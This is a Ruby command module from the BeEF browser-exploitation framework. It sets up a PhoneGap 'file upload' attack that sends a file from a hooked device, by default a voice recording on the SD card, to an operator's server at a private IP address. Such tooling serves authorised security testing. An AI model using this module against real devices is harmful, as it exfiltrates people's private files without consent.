#
# Copyright (c) 2006-2013 Wade Alcorn - wade@bindshell.net
# Browser Exploitation Framework (BeEF) - http://beefproject.com
# See the file 'doc/COPYING' for copying permission
#
# phonegap
#

class Phonegap_file_upload < BeEF::Core::Command
  
    def self.options
        return [{
            'name' => 'file_upload_dst', 
            'description' => 'Upload a file from device to your server', 
            'ui_label'=>'Destination', 
            'value' => 'http://192.168.9.130/recv-unauth.php',
            'width' => '300px'
            },{
            'name' => 'file_upload_src',    
            'description' => 'path to file on device', 
            'ui_label'=>'File Path', 
            'value' => '/sdcard/myrecording.wav',
            'width' => '300px'
            }]
  end

  def callback
    content = {}
    content['Result'] = @datastore['result']
    save content

  end 
end
